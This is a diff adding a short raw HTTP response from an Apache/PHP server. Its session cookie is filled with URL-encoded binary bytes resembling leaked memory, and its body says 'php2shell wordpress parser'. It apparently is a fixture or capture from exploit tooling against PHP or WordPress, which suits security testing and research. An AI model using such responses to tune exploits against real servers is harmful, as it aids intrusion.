@@ -1,0 +1,10 @@
+HTTP/1.1 200 OK
+Date: Thu, 22 Oct 2026 12:46:34 GMT
+Server: Apache/2.4.68 (Debian)
+X-Powered-By: PHP/8.4.26
+Set-Cookie: PHPSESSID=NNNNNNNNNNNNNNNNNNNNNNNN%06%95%A3%C9%2B%9ED%CD%01%00%00%00%07%00%00%00%00%00%00%00%F0%FF%FF%FF%00%94%85%91iy%00%00%01%00%00%00%01%00%00%00%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80%60%DB%21%92iy%00%00%01%00%00%00%07%00%00%00%00%00%00%00%F0%FF%FF%FF%C0%92%85%91iy%00%00%01%00%00%00%01%00%00%00%08%00%00%00%00%00%00%00; path=/
+Content-Length: 27
+Connection: close
+Content-Type: text/plain; charset=UTF-8
+
+php2shell wordpress parser
